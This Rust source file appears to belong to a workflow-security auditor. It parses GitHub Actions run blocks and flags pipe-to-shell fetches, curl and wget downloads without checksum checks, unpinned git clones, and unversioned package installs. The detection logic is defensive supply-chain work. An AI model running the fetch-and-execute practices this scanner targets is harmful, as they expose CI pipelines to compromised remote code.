use anyhow::{Context, Result};
use serde_norway::Value;
use std::collections::HashSet;
use std::path::{Component, Path, PathBuf};
use std::process::ExitCode;
use std::sync::Arc;
use tokio::sync::Semaphore;

use crate::audit_patterns::{
    self, DOCKER_PATTERNS, DOCKER_URL_PATTERNS, JS_PATTERNS, JS_URL_PATTERNS,
    PS_INSTALL_MODULE_UNVERSIONED, PY_PATTERNS, PY_URL_PATTERNS, Pattern,
    SH_CARGO_INSTALL_UNVERSIONED, SH_GEM_INSTALL_UNVERSIONED, SH_GH_RELEASE_LATEST, SH_GIT_CLONE,
    SH_NPM_UNVERSIONED, SH_NPX_UNVERSIONED, SH_PIP_GIT_URL_UNVERSIONED, SH_PIP_UNVERSIONED,
    SHELL_PATTERNS, SHELL_PIPE_PATTERNS, SHELL_URL_PATTERNS, cargo_install_has_version,
    category_str, extract_urls, gem_install_has_version, gh_release_has_tag,
    git_clone_has_pinned_ref, has_checksum_verify, npm_install_has_version, npx_has_version,
    pip_git_url_has_ref, pip_install_has_version, ps_install_has_required_version, url_has_version,
};
use crate::audited_actions::{AuditSource, AuditedActions};
use crate::auth;
use crate::config::Config;
use crate::github::GitHubClient;
use crate::output::{self, AuditFinding, AuditMatch, AuditReport};
use crate::workflow::{self, ActionRef, LocalActionRef};
use colored::Colorize;

/// Reason string for matches allowed via the `trusted-hosts` config list.
/// Shared between the allow site and the repo-config notice that counts them.
pub(crate) const REASON_TRUSTED_HOST: &str = "trusted host";
/// Reason string for matches allowed via `extra-data-formats` config entries.
pub(crate) const REASON_EXTRA_DATA_FORMAT: &str = "extra data format URL";

/// Accumulates findings and (when verbose) allowed matches during a scan.
///
/// `push_allowed` is a no-op when `verbose` is false, so callers can record
/// matches unconditionally without caring about the flag.
pub struct AuditCollector {
    pub findings: Vec<AuditFinding>,
    pub allowed: Vec<AuditMatch>,
    pub verbose: bool,
    /// Matches allowed via `trusted-hosts` — counted regardless of verbosity
    /// so the repo-config notice doesn't depend on `--verbose`.
    pub trusted_host_allowed: usize,
    /// Matches allowed via `extra-data-formats` — counted regardless of
    /// verbosity so repo-config notices surface score shaping.
    pub extra_data_format_allowed: usize,
}

impl AuditCollector {
    pub fn new(verbose: bool) -> Self {
        Self {
            findings: Vec::new(),
            allowed: Vec::new(),
            verbose,
            trusted_host_allowed: 0,
            extra_data_format_allowed: 0,
        }
    }

    pub fn push_finding(&mut self, finding: AuditFinding) {
        self.findings.push(finding);
    }

    pub fn push_allowed(&mut self, allowed: AuditMatch) {
        if allowed.reason == REASON_TRUSTED_HOST {
            self.trusted_host_allowed += 1;
        }
        if allowed.reason == REASON_EXTRA_DATA_FORMAT {
            self.extra_data_format_allowed += 1;
        }
        if self.verbose {
            self.allowed.push(allowed);
        }
    }
}

pub async fn run(
    repo_root: &Path,
    json: bool,
    sarif: bool,
    verbose: bool,
    config: &Config,
) -> Result<ExitCode> {
    // Machine-readable formats must keep stdout clean.
    let quiet = json || sarif;

    let token = auth::resolve_token().await;
    let client = token.as_ref().map(|t| GitHubClient::new(t.clone()));
    let had_token = client.is_some();

    let files = workflow::find_workflows(repo_root)?;
    let mut collector = AuditCollector::new(verbose);
    let mut scanned_actions: HashSet<String> = HashSet::new();
    let mut audited = AuditedActions::new(config.fetch_remote);
    let mut audited_bundled = 0usize;
    let mut audited_local_cache = 0usize;
    let mut audited_remote = 0usize;
    let mut scanned_fresh = 0usize;
    let mut scanned_unpinned_branch = 0usize;
    let mut scanned_unpinned_sliding = 0usize;
    let mut ignored = 0usize;

    for file in &files {
        let display_name = workflow::display_path(file.path(), repo_root);
        if !quiet {
            eprintln!("Scanning {display_name}");
        }

        let content = match workflow::read_workflow(file) {
            Ok(content) => content,
            Err(e) if workflow::is_unsafe_workflow_path(&e) => return Err(e),
            Err(e) => {
                // One unreadable/non-UTF-8 workflow shouldn't abort the scan.
                eprintln!("  {} {display_name}: {e}", "skipped".yellow());
                continue;
            }
        };

        match extract_run_blocks(file.path(), &content) {
            Ok(run_blocks) => {
                for (line_offset, run_content) in &run_blocks {
                    scan_shell_content(
                        run_content,
                        &display_name,
                        *line_offset,
                        "",
                        &mut collector,
                        config,
                    );
                }
            }
            Err(e) => {
                // Unparsable YAML shouldn't sink the scan; the `uses:` regex
                // scan below still runs.
                eprintln!(
                    "  {} run-block scan of {display_name}: {e}",
                    "skipped".yellow()
                );
            }
        }

        for action in workflow::scan_local_actions(&content) {
            let key = format!("local:{}", action.path);
            if !scanned_actions.insert(key) {
                continue;
            }

            if !quiet {
                eprintln!("  {} {}", "Scanning local".blue(), action.path);
            }

            let findings_before = collector.findings.len();
            match scan_local_action_source(repo_root, &action, &mut collector, config) {
                Ok(ActionScanStatus::Complete) => {}
                Ok(ActionScanStatus::Incomplete) => {
                    eprintln!("warning: incomplete scan of local action {}", action.path);
                }
                Err(e) => {
                    eprintln!("warning: could not scan local action {}: {e}", action.path);
                }
            }
            for finding in collector.findings.iter_mut().skip(findings_before) {
                finding.workflow_file = Some(display_name.clone());
                finding.workflow_line = Some(action.line_number);
            }
        }

        if let Some(client) = &client {
            let actions = workflow::scan_content(&content);
            for action in &actions {
                let key = remote_action_scan_key(action);
                if !scanned_actions.insert(key) {
                    continue;
                }

                if config.is_action_ignored(&action.owner_repo()) {
                    ignored += 1;
                    if !quiet {
                        eprintln!(
                            "  {}@{} {}",
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "ignored".dimmed()
                        );
                    }
                    continue;
                }

                if let Some(source) = audited
                    .check(
                        &action.owner,
                        &action.repo,
                        action.subpath.as_deref(),
                        &action.ref_string,
                    )
                    .await
                {
                    match source {
                        AuditSource::Bundled => audited_bundled += 1,
                        AuditSource::LocalCache => audited_local_cache += 1,
                        AuditSource::Remote => audited_remote += 1,
                    }
                    if !quiet {
                        eprintln!(
                            "  {}@{} {} ({})",
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "audited".green(),
                            source.label()
                        );
                    }
                    continue;
                }

                let pinned = matches!(
                    action.ref_type,
                    workflow::RefType::Sha | workflow::RefType::Tag
                );

                if !quiet {
                    if pinned {
                        eprintln!(
                            "  {} {}@{}",
                            "Fetching".blue(),
                            action.full_name(),
                            short_sha(&action.ref_string)
                        );
                    } else {
                        eprintln!(
                            "  {} {}@{} {}",
                            "Fetching".blue(),
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "(unpinned)".yellow()
                        );
                    }
                }

                let findings_before = collector.findings.len();
                match scan_action_source(client, action, &mut collector, config).await {
                    Ok(scan_status) => {
                        if scan_status == ActionScanStatus::Complete {
                            match action.ref_type {
                                workflow::RefType::Sha | workflow::RefType::Tag => {
                                    scanned_fresh += 1;
                                }
                                workflow::RefType::SlidingTag => {
                                    scanned_unpinned_sliding += 1;
                                }
                                workflow::RefType::Branch => {
                                    scanned_unpinned_branch += 1;
                                }
                            }
                        } else {
                            eprintln!(
                                "warning: incomplete scan of {}; clean verdict not cached",
                                action.full_name()
                            );
                        }
                        // Anchor remote-scan findings to the loading `uses:` line
                        // so SARIF results land inside the scanning repo.
                        for finding in collector.findings.iter_mut().skip(findings_before) {
                            finding.workflow_file = Some(display_name.clone());
                            finding.workflow_line = Some(action.line_number);
                        }
                        // Only cache clean verdicts for SHA refs — tag and branch
                        // contents can move after the verdict.
                        if scan_status == ActionScanStatus::Complete
                            && collector.findings.len() == findings_before
                            && action.ref_type == workflow::RefType::Sha
                        {
                            let tag = action.tag_comment.as_deref().unwrap_or(&action.ref_string);
                            audited.cache_clean(
                                &action.owner,
                                &action.repo,
                                action.subpath.as_deref(),
                                &action.ref_string,
                                tag,
                            );
                        }
                    }
                    Err(e) => {
                        eprintln!("warning: could not scan {}: {e}", action.full_name());
                    }
                }
            }
        }
    }

    if !quiet && !files.is_empty() {
        eprintln!();
    }

    let before_filters = collector.findings.len();
    collector.findings.retain(|f| {
        config.meets_severity(&f.severity) && !config.is_pattern_ignored(&f.description)
    });
    let suppressed = before_filters - collector.findings.len();

    // When auditing a repo you don't control, its own .pinprick.toml must not
    // silently set audit policy — say what it changed and how to opt out.
    if config.is_repo_local() {
        let trusted_host_allowed = collector.trusted_host_allowed;
        let mut parts = Vec::new();
        if suppressed > 0 {
            parts.push(format!("findings suppressed: {suppressed}"));
        }
        if ignored > 0 {
            parts.push(format!("actions skipped: {ignored}"));
        }
        if trusted_host_allowed > 0 {
            parts.push(format!("trusted-host fetches: {trusted_host_allowed}"));
        }
        if collector.extra_data_format_allowed > 0 {
            parts.push(format!(
                "extra-data-format fetches: {}",
                collector.extra_data_format_allowed
            ));
        }
        if !parts.is_empty() {
            eprintln!(
                "note: the scanned repo's .pinprick.toml affected results ({}) — rerun with --no-repo-config to ignore it",
                parts.join(", ")
            );
        }
    }

    collector
        .findings
        .sort_by_key(|f| match f.severity.as_str() {
            "high" => 0,
            "medium" => 1,
            _ => 2,
        });

    let has_findings = !collector.findings.is_empty();
    let report = AuditReport {
        actions_scanned: scanned_actions.len(),
        findings: collector.findings,
        allowed: collector.allowed,
        had_token,
        audited_bundled,
        audited_local_cache,
        audited_remote,
        scanned_fresh,
        scanned_unpinned_branch,
        scanned_unpinned_sliding,
        ignored,
    };

    if sarif {
        report.print_sarif();
    } else if json {
        report.print_json();
    } else {
        report.print_human(verbose);
    }

    if has_findings {
        Ok(ExitCode::from(1))
    } else {
        Ok(ExitCode::SUCCESS)
    }
}

fn remote_action_scan_key(action: &ActionRef) -> String {
    format!("{}@{}", action.full_name(), action.ref_string)
}

pub fn extract_run_blocks(path: &Path, content: &str) -> Result<Vec<(usize, String)>> {
    let yaml: Value =
        serde_norway::from_str(content).with_context(|| format!("parsing {}", path.display()))?;

    let mut blocks = Vec::new();
    let mut cursor: usize = 0; // 0-based line index, monotonically advancing

    // Walk jobs.*.steps[].run, including nested parallel groups.
    // serde_norway's Mapping preserves insertion order, so iterating here
    // visits `run:` blocks in document order and we can anchor each one at
    // the next matching line, never earlier ones.
    if let Some(jobs) = yaml.get("jobs").and_then(|j| j.as_mapping()) {
        for (_job_name, job) in jobs {
            if let Some(steps) = job.get("steps") {
                for run in collect_step_run_blocks(steps) {
                    let (line, next_cursor) = find_run_line(content, run, cursor);
                    cursor = next_cursor;
                    // Line 0 (not found) is kept — the block is still
                    // scanned, just unanchored.
                    blocks.push((line, run.to_string()));
                }
            }
        }
    }

    Ok(blocks)
}

/// Collect the `run:` block bodies under a `steps:` sequence in document
/// order, descending into `parallel:` groups.
///
/// GitHub documents `parallel:` as a sequence of steps, so a nested group is
/// walked exactly like the top-level `steps:` list — which also covers
/// `parallel:` nested inside `parallel:`. A `background: true` step keeps its
/// own `run:` key and is collected like any other step. Steps without a `run:`
/// (`uses:`, `wait:`, `cancel:`) contribute nothing.
fn collect_step_run_blocks(steps: &Value) -> Vec<&str> {
    fn collect<'a>(steps: &'a Value, runs: &mut Vec<&'a str>) {
        let Some(sequence) = steps.as_sequence() else {
            return;
        };

        for step in sequence {
            let Some(mapping) = step.as_mapping() else {
                continue;
            };
            for (key, value) in mapping {
                match key.as_str() {
                    Some("run") => {
                        if let Some(run) = value.as_str() {
                            runs.push(run);
                        }
                    }
                    Some("parallel") => collect(value, runs),
                    _ => {}
                }
            }
        }
    }

    let mut runs = Vec::new();
    collect(steps, &mut runs);
    runs
}

/// Locate the 1-based line of `run_content` in the raw file, starting the
/// search at `start` (0-based). Returns the line and the cursor to start the
/// next search at. A zero line means "not found"; the cursor is preserved.
///
/// Prefers an exact trimmed-line match so `echo hello` does not steal the
/// position of a longer line like `    echo hello world` that appears first.
/// Falls back to `contains` if no exact match is found past the cursor, which
/// preserves the prior behavior for run blocks that serde_norway normalized.
fn find_run_line(file_content: &str, run_content: &str, start: usize) -> (usize, usize) {
    let Some(first_line) = run_content.lines().next() else {
        return (0, start);
    };
    let trimmed = first_line.trim();
    if trimmed.is_empty() {
        return (0, start);
    }
    let mut contains_hit: Option<usize> = None;
    for (i, line) in file_content.lines().enumerate().skip(start) {
        if line.trim() == trimmed {
            return (i + 1, i + 1);
        }
        if contains_hit.is_none() && line.contains(trimmed) {
            contains_hit = Some(i);
        }
    }
    match contains_hit {
        Some(i) => (i + 1, i + 1),
        None => (0, start),
    }
}

/// Whether a shell source line is a pure comment and thus never executed.
/// Trailing comments on a command line are not covered — stripping an
/// unquoted `#` would require full shell tokenization and risks hiding a
/// real payload embedded in a quoted string.
fn is_shell_comment_line(line: &str) -> bool {
    line.trim_start().starts_with('#')
}

/// Join shell lines ending in `\` into a single logical line, anchored at the
/// 0-based index of the first physical line.
fn join_continuations(content: &str) -> Vec<(usize, String)> {
    let mut out: Vec<(usize, String)> = Vec::new();
    let mut pending: Option<(usize, String)> = None;
    for (i, raw) in content.lines().enumerate() {
        let trimmed_end = raw.trim_end();
        // A comment never continues onto the next line — a trailing backslash
        // is just comment text, so the next line is a new command. Joining it
        // into the comment would hide it from the scan.
        let backslash_continuation = trimmed_end.ends_with('\\');
        let operator_continuation = ends_with_pipeline_operator(trimmed_end);
        let is_continuation = (backslash_continuation || operator_continuation)
            && !(pending.is_none() && is_shell_comment_line(raw));
        let body = if backslash_continuation {
            &trimmed_end[..trimmed_end.len() - 1]
        } else {
            raw
        };
        match pending.as_mut() {
            Some((_, buf)) => {
                buf.push(' ');
                buf.push_str(body.trim());
            }
            None => {
                pending = Some((i, body.to_string()));
            }
        }
        if !is_continuation && let Some((start, buf)) = pending.take() {
            out.push((start, buf));
        }
    }
    if let Some(p) = pending {
        out.push(p);
    }
    out
}

fn ends_with_pipeline_operator(line: &str) -> bool {
    line.ends_with('|') || line.ends_with("&&") || line.ends_with("||")
}

#[derive(Debug, Clone)]
struct ShellCommand {
    text: String,
    stages: Vec<ShellStage>,
}

#[derive(Debug, Clone)]
struct ShellStage {
    text: String,
    words: Vec<String>,
}

#[derive(Debug, Clone)]
struct GitCloneCommand {
    dir: String,
    command_index: usize,
}

fn parse_shell_line(line: &str) -> Vec<ShellCommand> {
    split_shell_control(line)
        .into_iter()
        .filter_map(|command| {
            let stages: Vec<ShellStage> = split_shell_pipeline(&command)
                .into_iter()
                .map(|stage| ShellStage {
                    words: shell_words(&stage),
                    text: stage,
                })
                .collect();
            if stages.is_empty() {
                None
            } else {
                Some(ShellCommand {
                    text: command,
                    stages,
                })
            }
        })
        .collect()
}

fn split_shell_control(line: &str) -> Vec<String> {
    split_shell(line, SplitMode::Control)
}

fn split_shell_pipeline(line: &str) -> Vec<String> {
    split_shell(line, SplitMode::Pipeline)
}

enum SplitMode {
    Control,
    Pipeline,
}

fn split_shell(line: &str, mode: SplitMode) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut chars = line.chars().peekable();
    let mut quote: Option<char> = None;
    let mut escaped = false;

    while let Some(ch) = chars.next() {
        if escaped {
            current.push(ch);
            escaped = false;
            continue;
        }
        if ch == '\\' && quote != Some('\'') {
            current.push(ch);
            escaped = true;
            continue;
        }
        if let Some(q) = quote {
            current.push(ch);
            if ch == q {
                quote = None;
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            current.push(ch);
            continue;
        }

        match mode {
            SplitMode::Control if ch == ';' => {
                push_shell_part(&mut out, &mut current);
            }
            SplitMode::Control if ch == '&' && chars.peek() == Some(&'&') => {
                chars.next();
                push_shell_part(&mut out, &mut current);
            }
            SplitMode::Control if ch == '|' && chars.peek() == Some(&'|') => {
                chars.next();
                push_shell_part(&mut out, &mut current);
            }
            SplitMode::Pipeline if ch == '|' && chars.peek() != Some(&'|') => {
                push_shell_part(&mut out, &mut current);
            }
            _ => current.push(ch),
        }
    }

    push_shell_part(&mut out, &mut current);
    out
}

fn push_shell_part(out: &mut Vec<String>, current: &mut String) {
    let part = current.trim();
    if !part.is_empty() {
        out.push(part.to_string());
    }
    current.clear();
}

fn shell_words(command: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut chars = command.chars().peekable();
    let mut quote: Option<char> = None;
    let mut escaped = false;

    while let Some(ch) = chars.next() {
        if escaped {
            current.push(ch);
            escaped = false;
            continue;
        }
        if ch == '\\' && quote != Some('\'') {
            escaped = true;
            continue;
        }
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            } else {
                current.push(ch);
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            continue;
        }
        if ch.is_whitespace() {
            push_shell_word(&mut words, &mut current);
            continue;
        }
        if ch == '>' {
            push_shell_word(&mut words, &mut current);
            if chars.peek() == Some(&'>') {
                chars.next();
                words.push(">>".to_string());
            } else {
                words.push(">".to_string());
            }
            continue;
        }
        current.push(ch);
    }

    push_shell_word(&mut words, &mut current);
    words
}

fn push_shell_word(words: &mut Vec<String>, current: &mut String) {
    if !current.is_empty() {
        words.push(std::mem::take(current));
    }
}

fn url_piped_to_jq(line: &str, url: &str) -> bool {
    parse_shell_line(line).into_iter().any(|command| {
        let Some(fetch_stage) = command
            .stages
            .iter()
            .position(|stage| stage.text.contains(url))
        else {
            return false;
        };
        command
            .stages
            .iter()
            .skip(fetch_stage + 1)
            .any(stage_invokes_jq)
    })
}

fn stage_invokes_jq(stage: &ShellStage) -> bool {
    command_word_index(&stage.words).is_some_and(|idx| stage.words[idx] == "jq")
}

fn command_word_index(words: &[String]) -> Option<usize> {
    words
        .iter()
        .position(|word| !word.contains('=') || word.starts_with('-'))
}

fn fetch_output_targets(line: &str) -> Vec<String> {
    let mut targets = Vec::new();
    for command in parse_shell_line(line) {
        for stage in command.stages {
            if let Some(target) = fetch_output_target(&stage)
                && !targets.contains(&target)
            {
                targets.push(target);
            }
        }
    }
    targets
}

fn fetch_output_target(stage: &ShellStage) -> Option<String> {
    let fetch_index = stage
        .words
        .iter()
        .position(|word| word == "curl" || word == "wget")?;
    let fetch = stage.words[fetch_index].as_str();
    let option_target = match fetch {
        "curl" => curl_output_target(&stage.words[fetch_index + 1..]),
        "wget" => wget_output_target(&stage.words[fetch_index + 1..]),
        _ => None,
    };
    option_target.or_else(|| redirect_output_target(&stage.words))
}

fn curl_output_target(words: &[String]) -> Option<String> {
    let mut urls = words
        .iter()
        .filter(|word| word.starts_with("http://") || word.starts_with("https://"));
    let mut i = 0;
    while i < words.len() {
        let word = words[i].as_str();
        if matches!(word, "-o" | "--output") {
            return words.get(i + 1).and_then(|target| usable_target(target));
        }
        if let Some(target) = word.strip_prefix("--output=") {
            return usable_target(target);
        }
        if word == "-O" || word == "--remote-name" || short_flag_has_remote_name(word) {
            return urls.next().and_then(|url| url_basename(url));
        }
        if short_flag_uses_output(word) {
            return words.get(i + 1).and_then(|target| usable_target(target));
        }
        if let Some(target) = curl_attached_output(word) {
            return usable_target(target);
        }
        i += 1;
    }
    None
}

fn curl_attached_output(word: &str) -> Option<&str> {
    let flags = word.strip_prefix('-')?;
    if flags.starts_with('-') {
        return None;
    }
    let pos = flags.find('o')?;
    let target = &flags[pos + 1..];
    (!target.is_empty()).then_some(target)
}

fn short_flag_uses_output(word: &str) -> bool {
    let Some(flags) = word.strip_prefix('-') else {
        return false;
    };
    !flags.starts_with('-') && flags.ends_with('o')
}

fn short_flag_has_remote_name(word: &str) -> bool {
    let Some(flags) = word.strip_prefix('-') else {
        return false;
    };
    !flags.starts_with('-') && flags.contains('O')
}

fn wget_output_target(words: &[String]) -> Option<String> {
    let mut i = 0;
    while i < words.len() {
        let word = words[i].as_str();
        if matches!(word, "-O" | "--output-document") {
            return words.get(i + 1).and_then(|target| usable_target(target));
        }
        if let Some(target) = word.strip_prefix("--output-document=") {
            return usable_target(target);
        }
        if let Some(target) = word.strip_prefix("-O")
            && !target.is_empty()
        {
            return usable_target(target);
        }
        i += 1;
    }
    None
}

fn redirect_output_target(words: &[String]) -> Option<String> {
    words.windows(2).find_map(|pair| {
        if pair[0] == ">" || pair[0] == ">>" {
            usable_target(&pair[1])
        } else {
            None
        }
    })
}

fn usable_target(target: &str) -> Option<String> {
    let target = normalize_path_token(target);
    (!target.is_empty() && target != "-" && !target.starts_with('&')).then_some(target)
}

fn url_basename(url: &str) -> Option<String> {
    let clean = url.split(['?', '#']).next().unwrap_or(url);
    let name = clean.rsplit('/').next().unwrap_or_default();
    usable_target(name)
}

fn checksum_verifies_target(line: &str, target: &str) -> bool {
    parse_shell_line(line).into_iter().any(|command| {
        command
            .stages
            .iter()
            .any(|stage| checksum_stage_verifies_target(stage, target))
    })
}

fn checksum_stage_verifies_target(stage: &ShellStage, target: &str) -> bool {
    has_checksum_verify(&stage.text)
        && stage
            .words
            .iter()
            .any(|word| checksum_word_matches_target(word, target))
}

fn checksum_word_matches_target(word: &str, target: &str) -> bool {
    let word = normalize_path_token(word);
    let target = normalize_path_token(target);
    word == target
        || word
            .strip_prefix(&target)
            .is_some_and(|suffix| matches!(suffix, ".sha256" | ".sha512" | ".sha1" | ".sig"))
}

fn git_clone_has_bound_sha_checkout(logical: &[(usize, String)], li: usize) -> bool {
    let clones = unpinned_git_clones(&logical[li].1);
    !clones.is_empty()
        && clones
            .iter()
            .all(|clone| clone_has_bound_sha_checkout(logical, li, clone))
}

fn unpinned_git_clones(line: &str) -> Vec<GitCloneCommand> {
    parse_shell_line(line)
        .into_iter()
        .enumerate()
        .filter_map(|(command_index, command)| {
            if command.stages.iter().any(stage_has_git_clone)
                && !git_clone_has_pinned_ref(&command.text)
            {
                git_clone_dir(&command).map(|dir| GitCloneCommand { dir, command_index })
            } else {
                None
            }
        })
        .collect()
}

fn stage_has_git_clone(stage: &ShellStage) -> bool {
    git_word_index(&stage.words)
        .is_some_and(|idx| stage.words.get(idx + 1).is_some_and(|w| w == "clone"))
}

fn git_clone_dir(command: &ShellCommand) -> Option<String> {
    let stage = command
        .stages
        .iter()
        .find(|stage| stage_has_git_clone(stage))?;
    let git = git_word_index(&stage.words)?;
    let args = &stage.words[git + 2..];
    let mut positionals = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let word = args[i].as_str();
        if git_clone_option_takes_value(word) {
            i += 2;
            continue;
        }
        if let Some(flag) = word.split_once('=').map(|(flag, _)| flag)
            && git_clone_option_takes_value(flag)
        {
            i += 1;
            continue;
        }
        if word.starts_with('-') {
            i += 1;
            continue;
        }
        positionals.push(word);
        i += 1;
    }

    if let Some(dir) = positionals.get(1) {
        usable_target(dir)
    } else {
        positionals.first().and_then(|url| clone_default_dir(url))
    }
}

fn git_clone_option_takes_value(flag: &str) -> bool {
    matches!(
        flag,
        "-b" | "--branch"
            | "-c"
            | "--config"
            | "--depth"
            | "--origin"
            | "-o"
            | "--template"
            | "--reference"
            | "--reference-if-able"
            | "--separate-git-dir"
            | "--jobs"
            | "-j"
    )
}

fn clone_default_dir(url: &str) -> Option<String> {
    let clean = url.trim_end_matches('/').trim_end_matches(".git");
    usable_target(clean.rsplit(['/', ':']).next().unwrap_or(clean))
}

fn clone_has_bound_sha_checkout(
    logical: &[(usize, String)],
    clone_line: usize,
    clone: &GitCloneCommand,
) -> bool {
    let mut current_dir: Option<String> = None;
    for offset in 0..=3 {
        let Some((_, line)) = logical.get(clone_line + offset) else {
            break;
        };
        let commands = parse_shell_line(line);
        for (command_index, command) in commands.iter().enumerate() {
            if offset == 0 && command_index <= clone.command_index {
                continue;
            }
            if let Some(dir) = command_cd_dir(command) {
                current_dir = Some(dir);
                continue;
            }
            if command_has_bound_checkout(command, &clone.dir, current_dir.as_deref()) {
                return true;
            }
        }
    }
    false
}

fn command_cd_dir(command: &ShellCommand) -> Option<String> {
    let stage = command.stages.first()?;
    let idx = command_word_index(&stage.words)?;
    if stage.words[idx] == "cd" {
        stage.words.get(idx + 1).and_then(|dir| usable_target(dir))
    } else {
        None
    }
}

fn command_has_bound_checkout(
    command: &ShellCommand,
    clone_dir: &str,
    current_dir: Option<&str>,
) -> bool {
    command.stages.iter().any(|stage| {
        git_checkout_sha_dir(stage).is_some_and(|checkout_dir| match checkout_dir {
            Some(dir) => same_shell_path(&dir, clone_dir),
            None => current_dir.is_some_and(|dir| same_shell_path(dir, clone_dir)),
        })
    })
}

fn git_checkout_sha_dir(stage: &ShellStage) -> Option<Option<String>> {
    let git = git_word_index(&stage.words)?;
    let mut checkout_dir = None;
    let mut i = git + 1;
    while i < stage.words.len() {
        let word = stage.words[i].as_str();
        if word == "-C" {
            checkout_dir = stage.words.get(i + 1).and_then(|dir| usable_target(dir));
            i += 2;
            continue;
        }
        if let Some(dir) = word.strip_prefix("-C")
            && !dir.is_empty()
        {
            checkout_dir = usable_target(dir);
            i += 1;
            continue;
        }
        if word == "checkout" && stage.words.get(i + 1).is_some_and(|sha| is_full_sha(sha)) {
            return Some(checkout_dir);
        }
        i += 1;
    }
    None
}

fn git_word_index(words: &[String]) -> Option<usize> {
    words.iter().position(|word| word == "git")
}

fn is_full_sha(word: &str) -> bool {
    word.len() == 40 && word.chars().all(|c| c.is_ascii_hexdigit())
}

fn same_shell_path(left: &str, right: &str) -> bool {
    normalize_path_token(left) == normalize_path_token(right)
}

fn normalize_path_token(path: &str) -> String {
    let mut path = path
        .trim_matches(|c| matches!(c, '"' | '\'' | ')' | '(' | ',' | ';'))
        .trim()
        .to_string();
    while let Some(rest) = path.strip_prefix("./") {
        path = rest.to_string();
    }
    path
}

pub fn scan_shell_content(
    content: &str,
    source_file: &str,
    base_line: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // All passes scan logical lines — a command split across physical lines
    // with trailing backslashes is one shell command, and scanning the pieces
    // separately would let `curl … \` + `<url>` evade every two-part pattern.
    let logical = join_continuations(content);

    // Pipe-to-shell pass runs first so its findings land before `findings_before`
    // and escape the checksum downgrade loop below.
    let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
    for (start, joined) in &logical {
        if is_shell_comment_line(joined) {
            continue;
        }
        let line_num = base_line + start;
        let before = collector.findings.len();
        check_patterns(
            &SHELL_PIPE_PATTERNS,
            joined,
            source_file,
            line_num,
            action_name,
            collector,
        );
        if collector.findings.len() > before {
            pipe_shell_lines.insert(line_num);
        }
    }

    let findings_before = collector.findings.len();

    for (li, (start, line)) in logical.iter().enumerate() {
        let line = line.as_str();
        if is_shell_comment_line(line) {
            continue;
        }
        let line_num = base_line + start;
        if pipe_shell_lines.contains(&line_num) {
            continue;
        }

        let before = collector.findings.len();
        check_patterns(
            &SHELL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        let shell_matched = collector.findings.len() > before;

        // A `/latest/` URL already triggers the high-severity SH_*_LATEST rule
        // in SHELL_PATTERNS. Running SHELL_URL_PATTERNS on the same line would
        // re-flag it as a medium unversioned URL — duplicate noise.
        if !shell_matched {
            check_url_patterns(
                &SHELL_URL_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
                config,
            );
        }

        if SH_GH_RELEASE_LATEST.is_match(line) && !gh_release_has_tag(line) {
            collector.push_finding(AuditFinding {
                severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                description: "gh release download without pinned version".to_string(),
                workflow_file: None,
                workflow_line: None,
            });
        }

        if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
            if git_clone_has_bound_sha_checkout(&logical, li) {
                collector.push_allowed(AuditMatch {
                    severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                    category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
                    action: action_name.to_string(),
                    source_file: source_file.to_string(),
                    line: Some(line_num),
                    pattern_matched: line.trim().to_string(),
                    reason: "followed by SHA checkout".to_string(),
                });
            } else {
                collector.push_finding(AuditFinding {
                    severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                    category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
                    action: action_name.to_string(),
                    source_file: source_file.to_string(),
                    line: Some(line_num),
                    pattern_matched: line.trim().to_string(),
                    description: "git clone without pinned ref — clones HEAD of default branch"
                        .to_string(),
                    workflow_file: None,
                    workflow_line: None,
                });
            }
        }

        if SH_PIP_UNVERSIONED.is_match(line) && !pip_install_has_version(line) {
            push_pkg_finding(
                "pip install without version pin",
                audit_patterns::Severity::Low,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_NPM_UNVERSIONED.is_match(line) && !npm_install_has_version(line) {
            push_pkg_finding(
                "npm install without version pin",
                audit_patterns::Severity::Low,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_CARGO_INSTALL_UNVERSIONED.is_match(line) && !cargo_install_has_version(line) {
            push_pkg_finding(
                "cargo install without --version pin",
                audit_patterns::Severity::Low,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_GEM_INSTALL_UNVERSIONED.is_match(line) && !gem_install_has_version(line) {
            push_pkg_finding(
                "gem install without version pin",
                audit_patterns::Severity::Low,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_NPX_UNVERSIONED.is_match(line) && !npx_has_version(line) {
            push_pkg_finding(
                "npx without version pin — fetches and executes latest on every run",
                audit_patterns::Severity::Medium,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if PS_INSTALL_MODULE_UNVERSIONED.is_match(line) && !ps_install_has_required_version(line) {
            push_pkg_finding(
                "PowerShell Install-Module/Install-Script without -RequiredVersion",
                audit_patterns::Severity::Medium,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_PIP_GIT_URL_UNVERSIONED.is_match(line) && !pip_git_url_has_ref(line) {
            push_pkg_finding(
                "pip install git+URL without @<ref> — tracks default branch HEAD",
                audit_patterns::Severity::Medium,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
    }

